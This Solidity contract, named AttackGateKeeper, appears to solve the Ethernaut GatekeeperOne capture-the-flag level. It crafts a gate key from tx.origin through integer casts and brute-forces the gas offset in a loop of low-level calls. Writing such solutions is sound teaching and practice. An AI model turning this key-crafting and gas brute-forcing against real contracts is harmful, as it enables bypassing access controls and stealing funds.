// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/utils/math/SafeMath.sol';

import "interfaces/Igatekeeper.sol";

contract AttackGateKeeper {
    using SafeMath for uint256;

    address payable public owner;
    address public gateKeeper;

    event key_value(
        uint256 value
    );

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(address _address) {
        gateKeeper = _address;
        owner = payable(msg.sender);
    }

    function attack() public onlyOwner {

       

        // E.g Converting to a bigger type
        // uint32 a = 0x12345678;
        // uint64 b = uint64(a); // b = 0x0000000012345678


        // E.g Converting to a smaller type
        // uint64 a = 0x0000000012345678;
        // uint32 b = uint32(a); // b = 0x12345678


        // Let say k = (uint64) _gateKey

        // Third and First condition
        uint16 k16 = uint16(uint160(tx.origin));

        // Second condition
        // Let say k16 as 0x1234

        // Binary Representation:
        // 0b0000000000000000000000000000000000000000000000000000000000000001 
        // Shift this value to the left by 63 bits using the << operator.
        // This results in a value of 0x8000000000000000.

        // Cast k16 to a uint64 to get a value of 0x0000000000001234.

        // Add the two values from steps 2 and 3 to get a value of 0x8000000000001234.
                                                                //    0x0000000000001234

        // require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");

        // This is what we pass in uint64 k64, which is basically into uint64(_gateKey), (e.g. 0x8000000000001234)
        // and then the smart contract checks (uint32(uint64(_gateKey)) is 0x0000000000001234. 
        // but since it is not, the answer is NOT EQUAL, thus you passed the condition

        uint64 k64 = uint64(1 << 63) + uint64(k16);

        //convert back to bytes8 as required by gateThree
        bytes8 gateKey = bytes8(k64);

        bytes memory encodedParams = abi.encodeWithSignature(
            ("enter(bytes8)"),
            gateKey
        );
        // We need to play with the amount of gas. Instead of trying to calculate 
        // exactly how much gas we had spent until this point I decided to brute force it.
        for (uint256 i = 0; i < 200; i++) {                                     // offset
            (bool result, bytes memory data) = address(gateKeeper).call{gas: i + 150 + 8191 * 3}
                (
                encodedParams
            );
            if (result) {
                emit key_value(i);
                break;
            }
        }
    }
}